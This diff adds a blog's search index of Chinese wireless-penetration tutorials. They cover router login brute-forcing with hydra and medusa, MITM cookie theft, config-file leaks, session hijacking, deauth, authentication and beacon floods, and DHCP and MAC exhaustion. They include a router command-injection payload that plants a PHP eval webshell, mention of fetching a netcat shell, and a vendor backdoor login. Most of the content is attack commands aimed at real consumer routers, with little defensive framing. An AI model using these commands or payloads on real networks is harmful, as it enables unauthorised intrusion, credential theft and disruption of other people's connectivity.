@@ -1,0 +1,1159 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search>
+    
+    
+    <entry>
+        <title><![CDATA[维持访问-远程管理、XSS]]></title>
+        <url>https://517736522.github.io/2017/02/15/%E7%BB%B4%E6%8C%81%E8%AE%BF%E9%97%AE-%E8%BF%9C%E7%A8%8B%E7%AE%A1%E7%90%86%E3%80%81XSS/</url>
+        <content type="html"><![CDATA[<p>留后门。  </p>
+<h2 id="远程WEB管理"><a href="#远程WEB管理" class="headerlink" title="远程WEB管理"></a>远程WEB管理</h2><p><img src="/2017/02/15/维持访问-远程管理、XSS/1.jpg" alt="1"><br>输入255.255.255.255所有人从外网上访问（注意WAN IP是不是外网IP,也许有些人做了NAT,所以会失效)   </p>
+<p>nmap -sT IP<br>确定是不是开了<br><img src="/2017/02/15/维持访问-远程管理、XSS/2.jpg" alt="2">  </p>
+<p><img src="/2017/02/15/维持访问-远程管理、XSS/3.jpg" alt="3">  </p>
+<h2 id="动态DNS-DDNS"><a href="#动态DNS-DDNS" class="headerlink" title="动态DNS DDNS"></a>动态DNS DDNS</h2><p>比如xiwangdongtai 3322 花生壳  </p>
+<p><img src="/2017/02/15/维持访问-远程管理、XSS/4.jpg" alt="4"><br>不管有没做NAT,还是内网层路由器，做了DDNS后都是可以访问的</p>
+<h2 id="XSS-CSRF"><a href="#XSS-CSRF" class="headerlink" title="XSS,CSRF"></a>XSS,CSRF</h2><p>有些小厂商路由器未对输入框作过滤，导致的XSS<br><img src="/2017/02/15/维持访问-远程管理、XSS/5.jpg" alt="5"><br>获取的cookie，有些cookie会有账号密码  </p>
+]]></content>
+        
+        <categories>
+            
+            <category> 无线渗透 </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> 无线 </tag>
+            
+            <tag> 渗透 </tag>
+            
+            <tag> 维持访问 </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
+        <title><![CDATA[权限提升-破解无线路由器登陆密码]]></title>
+        <url>https://517736522.github.io/2017/02/15/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E7%A0%B4%E8%A7%A3%E6%97%A0%E7%BA%BF%E8%B7%AF%E7%94%B1%E5%99%A8%E7%99%BB%E9%99%86%E5%AF%86%E7%A0%81/</url>
+        <content type="html"><![CDATA[<p><img src="/2017/02/15/权限提升-破解无线路由器登陆密码/1.jpg" alt="1">  </p>
+<h2 id="爆破登陆页面"><a href="#爆破登陆页面" class="headerlink" title="爆破登陆页面  "></a>爆破登陆页面  </h2><p>hydra -L user.txt -P pass.txt <a href="http://33.1.1.254" target="_blank" rel="external">http://33.1.1.254</a><br><img src="/2017/02/15/权限提升-破解无线路由器登陆密码/2.jpg" alt="2">  </p>
+<h2 id="MITM攻击破解路由器登陆密码"><a href="#MITM攻击破解路由器登陆密码" class="headerlink" title="MITM攻击破解路由器登陆密码  "></a>MITM攻击破解路由器登陆密码  </h2><p>通过中间人攻击窃听别人登陆<br><img src="/2017/02/15/权限提升-破解无线路由器登陆密码/3.jpg" alt="3"><br>获取到cookie也行，进行base64解码<br><img src="/2017/02/15/权限提升-破解无线路由器登陆密码/4.jpg" alt="4"><br><img src="/2017/02/15/权限提升-破解无线路由器登陆密码/5.jpg" alt="5">  </p>
+]]></content>
+        
+        <categories>
+            
+            <category> 无线渗透 </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> 无线 </tag>
+            
+            <tag> 渗透 </tag>
+            
+            <tag> hydra </tag>
+            
+            <tag> 权限提升 </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
+        <title><![CDATA[权限提升-无线路由器漏洞攻击]]></title>
+        <url>https://517736522.github.io/2017/02/15/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%97%A0%E7%BA%BF%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%87%BB/</url>
+        <content type="html"><![CDATA[<h2 id="CFG配置文件泄露攻击"><a href="#CFG配置文件泄露攻击" class="headerlink" title="CFG配置文件泄露攻击"></a>CFG配置文件泄露攻击</h2><p>路由器配置文件指的是路由器通过备份等方式形成的文件<br><img src="/2017/02/15/权限提升-无线路由器漏洞攻击/1.jpg" alt="1"><br>点击按钮直接就是下载，说明配置文件已经存在内部<br><img src="/2017/02/15/权限提升-无线路由器漏洞攻击/2.jpg" alt="2"><br><img src="/2017/02/15/权限提升-无线路由器漏洞攻击/3.jpg" alt="3">  </p>
+<p><img src="/2017/02/15/权限提升-无线路由器漏洞攻击/4.jpg" alt="4"><br>复制下载链接<br><img src="/2017/02/15/权限提升-无线路由器漏洞攻击/5.jpg" alt="5"><br>在没登陆的情况下，下载，发现是可以的<br><img src="/2017/02/15/权限提升-无线路由器漏洞攻击/6.jpg" alt="6"><br>这个漏洞不是每个路由器都存在的  </p>
+<h2 id="WEB-UI会话劫持攻击"><a href="#WEB-UI会话劫持攻击" class="headerlink" title="WEB UI会话劫持攻击"></a>WEB UI会话劫持攻击</h2><p>老漏洞。<br>一般家用路由器不会有数据库来验证登陆的，都是用的配置文件  </p>
+<p>1.假设10.1.1.1登陆了这个路由器<br>2.我把我的IP改为10.1.1.1<br>3.我去访问路由器，发现已经是登陆状态了<br>或者随便输账号密码就登陆进去了</p>
+<h2 id="命令执行漏洞"><a href="#命令执行漏洞" class="headerlink" title="命令执行漏洞"></a>命令执行漏洞</h2><p><img src="/2017/02/15/权限提升-无线路由器漏洞攻击/7.jpg" alt="7"><br>命令执行+未授权访问  </p>
+<h2 id="网络监测漏洞"><a href="#网络监测漏洞" class="headerlink" title="网络监测漏洞"></a>网络监测漏洞</h2><p>大部分路由器都是基于LINUX系统，造成原因是输入框没有过滤<br>30%的路由器都存在<br><img src="/2017/02/15/权限提升-无线路由器漏洞攻击/8.jpg" alt="8"><br>那么可以这样利用<br>路由器可插入一句话木马（看你的路由器采用asp还是php环境）<br>ping 127.0.0.1 -c 1 &amp; “&lt;?php eval($_POST[a]);?&gt;” &gt; /var/www/yjh.php  </p>
+<p><img src="/2017/02/15/权限提升-无线路由器漏洞攻击/9.jpg" alt="9"><br>也可以wget netcat 直连shell  </p>
+<p>使用Cookie注入绕过密码登陆Tenda路由管理页<br>xiao106347.blog.163.com/blog/static/21599201401181817753<br><img src="/2017/02/15/权限提升-无线路由器漏洞攻击/10.jpg" alt="10">  </p>
+<h2 id="TLink后门漏洞"><a href="#TLink后门漏洞" class="headerlink" title="TLink后门漏洞"></a>TLink后门漏洞</h2><p><img src="/2017/02/15/权限提升-无线路由器漏洞攻击/12.jpg" alt="12"><br>访问以上网页，需要输入账号密码<br><img src="/2017/02/15/权限提升-无线路由器漏洞攻击/13.jpg" alt="13"><br>账号osteam密码5up<br><img src="/2017/02/15/权限提升-无线路由器漏洞攻击/14.jpg" alt="14">  </p>
+<h2 id="有些路由器存在密码验证安全漏洞"><a href="#有些路由器存在密码验证安全漏洞" class="headerlink" title="有些路由器存在密码验证安全漏洞  "></a>有些路由器存在密码验证安全漏洞  </h2><p>打开登陆页面-查看源文件-有时候会发现base64密码<br><img src="/2017/02/15/权限提升-无线路由器漏洞攻击/15.jpg" alt="15"><br>截图不存在漏洞  </p>
+<h2 id="乌云下也有很多漏洞"><a href="#乌云下也有很多漏洞" class="headerlink" title="乌云下也有很多漏洞  "></a>乌云下也有很多漏洞  </h2><p><img src="/2017/02/15/权限提升-无线路由器漏洞攻击/11.jpg" alt="11"><br>搜索路由器，牌子  </p>
+]]></content>
+        
+        <categories>
+            
+            <category> 无线渗透 </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> 无线 </tag>
+            
+            <tag> 渗透 </tag>
+            
+            <tag> 权限提升 </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
+        <title><![CDATA[权限提升-RouterSwitch等远程登陆TelnetSSH等暴力破解]]></title>
+        <url>https://517736522.github.io/2017/02/15/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-RouterSwitch%E7%AD%89%E8%BF%9C%E7%A8%8B%E7%99%BB%E9%99%86TelnetSSH%E7%AD%89%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/</url>
+        <content type="html"><![CDATA[<p>扫描网卡设备<br>nmap -sT 33.1.1.254<br>扫描TCP常用端口<br><img src="/2017/02/15/权限提升-RouterSwitch等远程登陆TelnetSSH等暴力破解/1.jpg" alt="1"><br>发现telnet端口开放  </p>
+<p>但是不知道telnet账号密码 ，只能通过爆破了<br>hydra -l cisco(假设知道账号） -P pass.txt telnet://33.1.1.254<br><img src="/2017/02/15/权限提升-RouterSwitch等远程登陆TelnetSSH等暴力破解/2.jpg" alt="2">  </p>
+<p>用medusa工具也行<br>medusa -h 10.1.1.254 -U user.txt -P pass.txt -M telnet<br><img src="/2017/02/15/权限提升-RouterSwitch等远程登陆TelnetSSH等暴力破解/3.jpg" alt="3">  </p>
+]]></content>
+        
+        <categories>
+            
+            <category> 无线渗透 </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> 无线 </tag>
+            
+            <tag> 渗透 </tag>
+            
+            <tag> hydra </tag>
+            
+            <tag> medusa </tag>
+            
+            <tag> 权限提升 </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
+        <title><![CDATA[报文处理-airdecap-ng解密报文]]></title>
+        <url>https://517736522.github.io/2017/02/15/%E6%8A%A5%E6%96%87%E5%A4%84%E7%90%86-airdecap-ng%E8%A7%A3%E5%AF%86%E6%8A%A5%E6%96%87/</url>
+        <content type="html"><![CDATA[<p>airdecap-ng用密码解密报文  </p>
+<h2 id="解密WEP"><a href="#解密WEP" class="headerlink" title="解密WEP"></a>解密WEP</h2><p>这种会有限制，密码长度必须为5，13,16,29,61<br>而且密码格式是进行十六进制转换后的密码<br>airdecap-ng -w KEY wep.cap<br><img src="/2017/02/15/报文处理-airdecap-ng解密报文/1.jpg" alt="1">  </p>
+<p>###关于进制的转换可以到以下网站  </p>
+<p><img src="/2017/02/15/报文处理-airdecap-ng解密报文/2.jpg" alt="2"><br><img src="/2017/02/15/报文处理-airdecap-ng解密报文/3.jpg" alt="3">  </p>
+<h2 id="解密WPA"><a href="#解密WPA" class="headerlink" title="解密WPA"></a>解密WPA</h2><p>airdecap-ng -l(不移除头部信息） -e [SSID] -p [PSK] wpa.cap<br><img src="/2017/02/15/报文处理-airdecap-ng解密报文/4.jpg" alt="4"><br>生成解密后的文件wpa-dec.cap  </p>
+]]></content>
+        
+        <categories>
+            
+            <category> 无线渗透 </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> 无线 </tag>
+            
+            <tag> 渗透 </tag>
+            
+            <tag> airdecap-ng </tag>
+            
+            <tag> 报文处理 </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
+        <title><![CDATA[报文处理-合并ivs-提取ivs-报文瘦身]]></title>
+        <url>https://517736522.github.io/2017/02/15/%E6%8A%A5%E6%96%87%E5%A4%84%E7%90%86-%E5%90%88%E5%B9%B6ivs-%E6%8F%90%E5%8F%96ivs-%E6%8A%A5%E6%96%87%E7%98%A6%E8%BA%AB/</url>
+        <content type="html"><![CDATA[<p>ivs:初始化向量<br>收集足够的ivs,用于破解WEP  </p>
+<h2 id="合并ivs"><a href="#合并ivs" class="headerlink" title="合并ivs"></a>合并ivs</h2><p>ivstools –merge <ivs file1=""> <ivs file2=""> <output file=""><br>合并多个ivs文件<br>ivstools –merge 1.ivs 2.ivs 3.ivs  </output></ivs></ivs></p>
+<h2 id="提取ivs"><a href="#提取ivs" class="headerlink" title="提取ivs"></a>提取ivs</h2><p>ivstool –convert wep.cap 1.ivs<br>从wep.cap包中提取ivs,保存为1.ivs<br><img src="/2017/02/15/报文处理-合并ivs-提取ivs-报文瘦身/1.jpg" alt="1">  </p>
+<h2 id="报文瘦身"><a href="#报文瘦身" class="headerlink" title="报文瘦身 "></a>报文瘦身 </h2><p>pyrit -r x.cap analyze<br>查看握手包情况<br><img src="/2017/02/15/报文处理-合并ivs-提取ivs-报文瘦身/2.jpg" alt="2"><br>(但是截图没有握手包)<br>假设TP-Link_5A4A存在握手包，那么我只想把它提取出来。<br>pyrit -r x.cap -e TP-Link_5A4A -o output.cap strip<br><img src="/2017/02/15/报文处理-合并ivs-提取ivs-报文瘦身/3.jpg" alt="3"><br>(截图提取失败，因为不存在握手包。）  </p>
+]]></content>
+        
+        <categories>
+            
+            <category> 无线渗透 </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> 无线 </tag>
+            
+            <tag> 渗透 </tag>
+            
+            <tag> 报文处理 </tag>
+            
+            <tag> ivstool </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
+        <title><![CDATA[报文处理-使用Cain,Abel解密报文]]></title>
+        <url>https://517736522.github.io/2017/02/15/%E6%8A%A5%E6%96%87%E5%A4%84%E7%90%86-%E4%BD%BF%E7%94%A8Cain-Abel%E8%A7%A3%E5%AF%86%E6%8A%A5%E6%96%87/</url>
+        <content type="html"><![CDATA[<p>使用Cain嗅探工具解密报文<br>add to list<br>添加到列表<br><img src="/2017/02/15/报文处理-使用Cain-Abel解密报文/1.jpg" alt="1"><br>右键报文-Decode<br><img src="/2017/02/15/报文处理-使用Cain-Abel解密报文/2.jpg" alt="2"><br>会生成xxx-dec.cap<br>用wireshark打开<br><img src="/2017/02/15/报文处理-使用Cain-Abel解密报文/3.jpg" alt="3"><br>全都是解密后的报文  </p>
+<p>以上是针对WEP的<br>下面是针对WPA的<br>同样将相对应的文件add to list<br><img src="/2017/02/15/报文处理-使用Cain-Abel解密报文/4.jpg" alt="4">  </p>
+<p><img src="/2017/02/15/报文处理-使用Cain-Abel解密报文/5.jpg" alt="5"><br>WPA passphrase 应该为ASCII格式的（需要自己算)<br><img src="/2017/02/15/报文处理-使用Cain-Abel解密报文/6.jpg" alt="6"><br>可尝试下直接在此处输入密码  </p>
+]]></content>
+        
+        <categories>
+            
+            <category> 无线渗透 </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> 无线 </tag>
+            
+            <tag> 渗透 </tag>
+            
+            <tag> 报文处理 </tag>
+            
+            <tag> Cain </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
+        <title><![CDATA[报文处理-wireshark抓取WEP,WPA报文并解密]]></title>
+        <url>https://517736522.github.io/2017/02/15/%E6%8A%A5%E6%96%87%E5%A4%84%E7%90%86-wireshark%E6%8A%93%E5%8F%96WEP-WPA%E6%8A%A5%E6%96%87%E5%B9%B6%E8%A7%A3%E5%AF%86/</url>
+        <content type="html"><![CDATA[<h2 id="WEP解密"><a href="#WEP解密" class="headerlink" title="WEP解密"></a>WEP解密</h2><p>无线抓包时抓的包都是有802.11加密的<br>wireshark有802.11包解密功能  </p>
+<p>airodump -w /root/wep  wlan0mon<br><img src="/2017/02/15/报文处理-wireshark抓取WEP-WPA报文并解密/1.jpg" alt="1">  </p>
+<p>使用wireshark打开  </p>
+<p><img src="/2017/02/15/报文处理-wireshark抓取WEP-WPA报文并解密/2.jpg" alt="2"><br>都是IEEE802.11类型包  </p>
+<p>Edit-Preferences(首选项）-Protocols-802.11  </p>
+<p><img src="/2017/02/15/报文处理-wireshark抓取WEP-WPA报文并解密/3.jpg" alt="3"><br>记得勾选上Enable decryption<br>输入十六进制格式的密码<br>应用后<br><img src="/2017/02/15/报文处理-wireshark抓取WEP-WPA报文并解密/4.jpg" alt="4"><br>采用这个密码的报文就会被解密  </p>
+<h2 id="WPA解密"><a href="#WPA解密" class="headerlink" title="WPA解密  "></a>WPA解密  </h2><p>同样进入首选项<br><img src="/2017/02/15/报文处理-wireshark抓取WEP-WPA报文并解密/5.jpg" alt="5"><br>EDit<br><img src="/2017/02/15/报文处理-wireshark抓取WEP-WPA报文并解密/6.jpg" alt="6"><br>key为密码+SSID<br>应用后<br><img src="/2017/02/15/报文处理-wireshark抓取WEP-WPA报文并解密/7.jpg" alt="7">  </p>
+<p>###window下的wireshark的格式：wpa-pwd:iSafe12345:iSafe_Normal  </p>
+]]></content>
+        
+        <categories>
+            
+            <category> 无线渗透 </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> 无线 </tag>
+            
+            <tag> 渗透 </tag>
+            
+            <tag> 报文处理 </tag>
+            
+            <tag> wireshark </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
+        <title><![CDATA[安卓渗透-使用lanmitm,幻影PIN,zanti]]></title>
+        <url>https://517736522.github.io/2017/02/14/%E5%AE%89%E5%8D%93%E6%B8%97%E9%80%8F-%E4%BD%BF%E7%94%A8lanmitm-%E5%B9%BB%E5%BD%B1PIN-zanti/</url>
+        <content type="html"><![CDATA[<h2 id="lanmitm"><a href="#lanmitm" class="headerlink" title="lanmitm"></a>lanmitm</h2><p><img src="/2017/02/14/安卓渗透-使用lanmitm-幻影PIN-zanti/1.jpg" alt="1">  </p>
+<p>界面是这样的<br><img src="/2017/02/14/安卓渗透-使用lanmitm-幻影PIN-zanti/2.jpg" alt="2"><br><img src="/2017/02/14/安卓渗透-使用lanmitm-幻影PIN-zanti/3.jpg" alt="3">  </p>
+<h2 id="幻影PIN"><a href="#幻影PIN" class="headerlink" title="幻影PIN"></a>幻影PIN</h2><p><img src="/2017/02/14/安卓渗透-使用lanmitm-幻影PIN-zanti/4.jpg" alt="4"><br><img src="/2017/02/14/安卓渗透-使用lanmitm-幻影PIN-zanti/5.jpg" alt="5">  </p>
+<h2 id="zanti"><a href="#zanti" class="headerlink" title="zanti"></a>zanti</h2><p><img src="/2017/02/14/安卓渗透-使用lanmitm-幻影PIN-zanti/6.jpg" alt="6">  </p>
+<p><img src="/2017/02/14/安卓渗透-使用lanmitm-幻影PIN-zanti/7.jpg" alt="7">  </p>
+<p><img src="/2017/02/14/安卓渗透-使用lanmitm-幻影PIN-zanti/8.jpg" alt="8">  </p>
+<p><img src="/2017/02/14/安卓渗透-使用lanmitm-幻影PIN-zanti/9.jpg" alt="9">  </p>
+]]></content>
+        
+        <categories>
+            
+            <category> 无线渗透 </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> 无线 </tag>
+            
+            <tag> 渗透 </tag>
+            
+            <tag> lanmitm </tag>
+            
+            <tag> 幻影PIN </tag>
+            
+            <tag> zanti </tag>
+            
+            <tag> 安卓渗透 </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
+        <title><![CDATA[干扰通讯-实现无线IPS并访问控制（类似ACL）]]></title>
+        <url>https://517736522.github.io/2017/02/14/%E5%B9%B2%E6%89%B0%E9%80%9A%E8%AE%AF-%E5%AE%9E%E7%8E%B0%E6%97%A0%E7%BA%BFIPS%E5%B9%B6%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%EF%BC%88%E7%B1%BB%E4%BC%BCACL%EF%BC%89/</url>
+        <content type="html"><![CDATA[<h2 id="airdrop-ng-一款被称之为基于策略的无线Deauth工具"><a href="#airdrop-ng-一款被称之为基于策略的无线Deauth工具" class="headerlink" title="airdrop-ng  一款被称之为基于策略的无线Deauth工具  "></a>airdrop-ng  一款被称之为基于策略的无线Deauth工具  </h2><p>有意思的是，Airdrop-ng并不是个从原理上全新设计的工具，相对于Aireplay-ng 配合-0参数表现出的单一目标指定缺陷，和MDK3等无线D.O.S工具覆盖性较广的不足，Airdrop-ng主要可以通过简单的规则文件编写和自带的 无线厂商OUI列表（即MAC地址列表），间接做到了由工具的使用者来决定无线网络的详细黑白名单，即授权可以连接无线网络的客户端、限定无线客户端与AP的连接对应关系等。<br>对于大多数无线攻击者而言，这款工具很显然地表现出了比MDK3更有效率的无线网络封杀能力，可以更加精准地干扰及锁定目标无线网络。而对于安全人员来说，若能够合理地编写规则，这款工具也能成为一款个不错的WIPS。<br>Airdrop-ng在 BackTrack4 R2下已经内置,在其他BT5,kali并没有  </p>
+<h2 id="实施步骤"><a href="#实施步骤" class="headerlink" title="实施步骤  "></a>实施步骤  </h2><p>###1.首先抓包<br>airodump-ng -w /root/Desktop/ips –out-format csv wlan0mon  </p>
+<p><img src="/2017/02/14/干扰通讯-实现无线IPS并访问控制（类似ACL）/1.jpg" alt="1"><br>抓两分钟的包<br><img src="/2017/02/14/干扰通讯-实现无线IPS并访问控制（类似ACL）/2.jpg" alt="2">  </p>
+<p>###2.编写一个规则文件<br>vim RULES<br>格式：d/BSSID|STA<br>a/bssid|STA  </p>
+<p><img src="/2017/02/14/干扰通讯-实现无线IPS并访问控制（类似ACL）/3.jpg" alt="3"><br>运行是自上而下的，符合ACL规则<br>第一条为允许98:..STA 连接80..AP<br>第二条为禁止98:..STA 连接任何SSID<br>第三条为禁止0C:..STA 连接2C:AB:25开头的AP<br>第四条为禁止苹果设备连接44：..AP<br>第五条为允许78:0C:B8开头的STA连接80：..AP<br>第六条除了上面以外，其他允许  </p>
+<p>###3.调用规则<br>airdrop-ng -i wlan0mon -r RULES -t /root/Desktop/ips-01.csv<br>就行了   </p>
+]]></content>
+        
+        <categories>
+            
+            <category> 无线渗透 </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> 无线 </tag>
+            
+            <tag> 渗透 </tag>
+            
+            <tag> 干扰通讯 </tag>
+            
+            <tag> airdrop-ng </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
+        <title><![CDATA[干扰通讯-Deauth-Flood攻击]]></title>
+        <url>https://517736522.github.io/2017/02/14/%E5%B9%B2%E6%89%B0%E9%80%9A%E8%AE%AF-Deauth-Flood%E6%94%BB%E5%87%BB/</url>
+        <content type="html"><![CDATA[<p>mdk3工具内置选项攻击<br>这个攻击跟aireplay-ng -0 一样<br>aireplay-ng -0 10 -a [BSSID] wlan0mon –ignore<br><img src="/2017/02/14/干扰通讯-Deauth-Flood攻击/1.jpg" alt="1"><br>-w 白名单文件<br>-b 黑名单文件<br>-s 速率<br>-c 信道  </p>
+<p>先要抓包<br><img src="/2017/02/14/干扰通讯-Deauth-Flood攻击/2.jpg" alt="2">  </p>
+<p>mdk3 wlan0mon d<br><img src="/2017/02/14/干扰通讯-Deauth-Flood攻击/3.jpg" alt="3"><br>针对全网的断网攻击<br><img src="/2017/02/14/干扰通讯-Deauth-Flood攻击/4.jpg" alt="4"><br>FF：FF：FF：FF：FF：FF为二层广播帧  </p>
+]]></content>
+        
+        <categories>
+            
+            <category> 无线渗透 </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> 无线 </tag>
+            
+            <tag> 渗透 </tag>
+            
+            <tag> mdk3 </tag>
+            
+            <tag> 干扰通讯 </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
+        <title><![CDATA[干扰通讯-Authen泛洪攻击]]></title>
+        <url>https://517736522.github.io/2017/02/14/%E5%B9%B2%E6%89%B0%E9%80%9A%E8%AE%AF-Authen%E6%B3%9B%E6%B4%AA%E6%94%BB%E5%87%BB/</url>
+        <content type="html"><![CDATA[<p>authentication洪水攻击<br>mdk3伪装大量的client去连接AP,无法有没密码是否错误，AP都得作出回应，并形成半连接状态。AP是有最大连接数的，会响应不过来。<br>如果合法主机需要连接这个被攻击AP上，是无法连接的。  </p>
+<p><img src="/2017/02/14/干扰通讯-Authen泛洪攻击/1.jpg" alt="1"><br>-a 指定mac地址，不指定则为所有<br>-m 使用合法的MAC 从OUI数据库中拿（厂商规定的MAc)<br>-c 不检查测试的成功性<br>-i 测试客户端连接到AP,重注入嗅探数据来保持活性（？）<br>-s 指定速率  </p>
+<p>确认AP<br><img src="/2017/02/14/干扰通讯-Authen泛洪攻击/2.jpg" alt="2">  </p>
+<p>mdk3 wlan0mon a -a [BSSID]<br><img src="/2017/02/14/干扰通讯-Authen泛洪攻击/3.jpg" alt="3"><br>seems to be INVULNERABLE!(看起来刀枪不入）<br>可能该路由器存在防护机制！  </p>
+]]></content>
+        
+        <categories>
+            
+            <category> 无线渗透 </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> 无线 </tag>
+            
+            <tag> 渗透 </tag>
+            
+            <tag> mdk3 </tag>
+            
+            <tag> 干扰通讯 </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
+        <title><![CDATA[干扰通讯-创建恶意无线热点]]></title>
+        <url>https://517736522.github.io/2017/02/13/%E5%B9%B2%E6%89%B0%E9%80%9A%E8%AE%AF-%E5%88%9B%E5%BB%BA%E6%81%B6%E6%84%8F%E6%97%A0%E7%BA%BF%E7%83%AD%E7%82%B9/</url>
+        <content type="html"><![CDATA[<p>beacon泛洪攻击：信标帧标识一个AP,通过伪造多个beacon,创建多个AP  </p>
+<p>MDK3工具（很牛逼） wireless DOS tool  </p>
+<p><img src="/2017/02/13/干扰通讯-创建恶意无线热点/1.jpg" alt="1">  </p>
+<p>–fullhelp 查看更详细的帮助<br><img src="/2017/02/13/干扰通讯-创建恶意无线热点/2.jpg" alt="2"><br>这个是今天的主角<br>-n 指定单一SSID名称<br>如果不指定，会随机生成乱码名称<br>-f 指定多个名称的File<br>-v 指定多个MAc和SSID<br>-d 使客户端形成对等网络<br>-w 设置成wep<br>-g 设为54M<br>-t 设置为WPA TKIP加密<br>-a 设置为WPA AES加密<br>-h 信道跳跃<br>-c 加信道<br>-s 速率每秒发多少beacon  </p>
+<p>mdk3 mon0 b -n iSafe_Normal -w -g -c 1 -s 200<br><img src="/2017/02/13/干扰通讯-创建恶意无线热点/3.jpg" alt="3"><br>只能创建出一个伪WIFI  </p>
+<p>mdk3 mon0 b -a -h -c 1 -s 200<br><img src="/2017/02/13/干扰通讯-创建恶意无线热点/4.jpg" alt="4"><br>纯恶意的发射beason<br><img src="/2017/02/13/干扰通讯-创建恶意无线热点/5.jpg" alt="5">   </p>
+<p>###创建常用名WIFI<br>先创建常用名的文本<br><img src="/2017/02/13/干扰通讯-创建恶意无线热点/6.jpg" alt="6"><br>mdk3 mon0 b -f /root/Desktop/ssid -a -h -c 1 -s 200<br><img src="/2017/02/13/干扰通讯-创建恶意无线热点/7.jpg" alt="7"><br><img src="/2017/02/13/干扰通讯-创建恶意无线热点/8.jpg" alt="8">   </p>
+]]></content>
+        
+        <categories>
+            
+            <category> 无线渗透 </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> 无线 </tag>
+            
+            <tag> 渗透 </tag>
+            
+            <tag> mdk3 </tag>
+            
+            <tag> 干扰通讯 </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
+        <title><![CDATA[内网渗透-mac地址表泛洪攻击、DHCP地址池耗尽攻击、思科发现协议泛洪攻击]]></title>
+        <url>https://517736522.github.io/2017/02/13/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-mac%E5%9C%B0%E5%9D%80%E8%A1%A8%E6%B3%9B%E6%B4%AA%E6%94%BB%E5%87%BB%E3%80%81DHCP%E5%9C%B0%E5%9D%80%E6%B1%A0%E8%80%97%E5%B0%BD%E6%94%BB%E5%87%BB%E3%80%81%E6%80%9D%E7%A7%91%E5%8F%91%E7%8E%B0%E5%8D%8F%E8%AE%AE%E6%B3%9B%E6%B4%AA%E6%94%BB%E5%87%BB/</url>
+        <content type="html"><![CDATA[<h2 id="mac地址表泛洪攻击"><a href="#mac地址表泛洪攻击" class="headerlink" title="mac地址表泛洪攻击"></a>mac地址表泛洪攻击</h2><p>交换机中的mac地址表是有限的，默认300秒超时时间，但是macof工具3秒钟即可填满，使得交换机无法再学习主机的MAC地址，任何经过交换机的数据包会因为找不到映射而引起单播泛洪即广播整个内网，这个时候就可以抓包查看其它用户的流量。  </p>
+<p>macof -i eth0<br><img src="/2017/02/13/内网渗透-mac地址表泛洪攻击、DHCP地址池耗尽攻击、思科发现协议泛洪攻击/1.jpg" alt="1">  </p>
+<p><img src="/2017/02/13/内网渗透-mac地址表泛洪攻击、DHCP地址池耗尽攻击、思科发现协议泛洪攻击/2.jpg" alt="2"><br>效果不好时，可以多开几个macof<br>此时就可以抓包了。  </p>
+<h2 id="DHCP地址池耗尽攻击"><a href="#DHCP地址池耗尽攻击" class="headerlink" title="DHCP地址池耗尽攻击"></a>DHCP地址池耗尽攻击</h2><p>因为DHCP服务器地址池有限一般为254个（24位）<br>攻击原理：伪装大量的源地址，去想DHCP服务器请求地址<br>dhcp有租期，在超时前同一地址不会分给不同主机<br>耗尽后，由于很多AP支持地址冲突检测，分发了的IP,是不会连接成功的<br>解决方案：DHCP snooping(家用路由器不具备）  </p>
+<p>###使用Yersinia攻击工具<br>DHCP原理：<br><img src="/2017/02/13/内网渗透-mac地址表泛洪攻击、DHCP地址池耗尽攻击、思科发现协议泛洪攻击/3.jpg" alt="3"><br><img src="/2017/02/13/内网渗透-mac地址表泛洪攻击、DHCP地址池耗尽攻击、思科发现协议泛洪攻击/4.jpg" alt="4"><br>首先得选择网卡-再选择攻击方式<br><img src="/2017/02/13/内网渗透-mac地址表泛洪攻击、DHCP地址池耗尽攻击、思科发现协议泛洪攻击/5.jpg" alt="5"><br>发送许多请求报文<br><img src="/2017/02/13/内网渗透-mac地址表泛洪攻击、DHCP地址池耗尽攻击、思科发现协议泛洪攻击/6.jpg" alt="6">  </p>
+<p>停止攻击<br><img src="/2017/02/13/内网渗透-mac地址表泛洪攻击、DHCP地址池耗尽攻击、思科发现协议泛洪攻击/7.jpg" alt="7">  </p>
